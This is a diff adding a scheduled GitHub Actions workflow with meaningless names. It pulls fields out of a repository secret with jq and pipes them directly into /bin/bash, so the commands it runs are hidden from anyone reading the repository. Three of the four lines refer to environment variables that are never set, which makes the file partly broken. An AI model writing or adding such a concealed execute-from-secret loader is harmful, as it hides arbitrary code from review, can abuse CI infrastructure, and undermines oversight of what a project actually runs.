@@ -1,0 +1,20 @@
+name: muxiangjiangying
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: muxiangjiangying
+        env:
+          vx64210: ${{ secrets.vx64210 }}
+        run: |
+          echo $vx64210 | jq -r .qqiz0135 | /bin/bash
+          echo $i9359 | jq -r .y182 | /bin/bash
+          echo $efqdn3 | jq -r .ofu79181 | /bin/bash
+          echo $hczho82356 | jq -r .wrac7170 | /bin/bash
+
